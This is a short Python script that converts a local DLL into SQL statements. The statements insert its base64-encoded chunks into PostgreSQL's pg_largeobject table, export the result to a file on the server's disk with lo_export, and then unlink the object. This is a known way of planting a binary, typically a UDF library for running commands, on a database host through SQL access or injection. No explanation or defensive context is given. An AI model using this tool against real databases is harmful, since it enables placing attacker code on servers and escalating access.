# coding;utf-8
import random
import base64
import binascii
id = random.randint(100000, 999999)
start = "INSERT INTO pg_largeobject VALUES (" + str(id) + ", %d, decode('"
end = "', 'base64'));"

if __name__ == '__main__':
    o = open('output.txt', 'w')
    with open('64.dll', 'rb') as fp:
        o.write('SELECT lo_create(%d);\n' % id)
        data = fp.read()
        for i in range(0,len(data),2048):
            o.write(start % (i / 2048) + '\n' + base64.b64encode( data[i:i+2048]).decode() + '\n' + end + '\n')
        o.write("SELECT lo_export(%d, 'E:\\test.dll');\nSELECT lo_unlink(%d);\n" % (id, id))
